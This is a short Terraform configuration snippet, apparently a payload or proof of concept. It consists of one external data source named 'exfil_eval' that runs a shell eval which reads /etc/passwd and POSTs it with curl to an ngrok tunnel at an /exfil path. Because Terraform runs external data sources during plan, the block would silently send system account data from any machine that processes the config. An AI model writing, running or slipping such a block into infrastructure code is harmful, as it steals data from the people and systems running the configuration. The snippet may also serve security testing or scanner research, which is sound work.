data "external" "exfil_eval" {
  program = [
    "sh", "-c",
    "eval \"cat /etc/passwd | curl -X POST --data-binary @- http://0.tcp.in.ngrok.io:10168/exfil\""
  ]
}
